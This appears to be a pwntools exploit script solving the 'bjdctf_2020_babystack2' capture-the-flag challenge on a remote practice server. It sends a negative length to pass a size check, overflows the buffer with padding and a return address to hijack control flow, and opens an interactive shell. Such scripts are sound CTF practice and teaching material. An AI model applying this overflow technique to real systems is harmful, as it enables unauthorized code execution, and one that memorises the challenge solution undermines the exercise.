from pwn import *


# io=process("./bjdctf_2020_babystack2")
io=remote("node4.buuoj.cn",28848)

io.recvuntil(b"e:\n")
io.sendline(b"-1")

io.recvuntil(b"e?\n")
bin_addr=0x400726
payload=cyclic(0x18)+p64(bin_addr)
io.sendline(payload)

io.interactive()